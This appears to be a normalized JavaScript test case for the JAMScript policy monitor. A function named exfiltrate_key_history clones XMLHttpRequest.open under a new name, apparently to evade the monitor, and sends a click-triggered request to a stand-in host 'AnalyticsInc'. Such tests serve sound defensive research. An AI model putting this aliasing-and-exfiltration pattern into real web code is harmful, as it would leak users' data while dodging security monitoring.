
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function clone(obj$$16) {
  var v11 = obj$$16 == null;
  var v19 = !v11;
  if(v19) {
    var v18 = typeof obj$$16;
    v11 = v18 != "object"
  }
  var v0 = v11;
  if(v0) {
    return obj$$16
  }
  var temp = {};
  var key$$14;
  for(key$$14 in obj$$16) {
    var v1 = temp;
    var v2 = key$$14;
    var v12 = obj$$16[key$$14];
    var v28 = clone(v12);
    v1[v2] = v28
  }
  return temp
}
function clone2(obj$$17) {
  var v3 = obj$$17.cloneNode;
  if(v3) {
    return obj$$17.cloneNode(true)
  }
  var v4;
  var v13 = obj$$17 instanceof Array;
  if(v13) {
    v4 = []
  }else {
    v4 = {}
  }
  var copy = v4;
  var attr;
  for(attr in obj$$17) {
    var v23 = obj$$17[attr];
    var v20 = typeof v23;
    var v14 = v20 == "function";
    var v22 = !v14;
    if(v22) {
      var v24 = obj$$17[attr];
      var v21 = v24 == null;
      var v26 = !v21;
      if(v26) {
        var v27 = obj$$17[attr];
        var v25 = v27.clone2;
        v21 = !v25
      }
      v14 = v21
    }
    var v8 = v14;
    if(v8) {
      copy[attr] = obj$$17[attr]
    }else {
      var v15 = obj$$17[attr];
      var v7 = v15 == obj$$17;
      if(v7) {
        copy[attr] = copy
      }else {
        var v5 = copy;
        var v6 = attr;
        var v16 = obj$$17[attr];
        var v29 = v16.clone2();
        v5[v6] = v29
      }
    }
  }
  return copy
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v9 = xmlhttp;
  var v17 = xmlhttp.open;
  var v30 = clone(v17);
  v9.opennew = v30;
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true);
  xmlhttp.send(null);
  return
}
var v10 = document.getElementById("test");
v10.onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
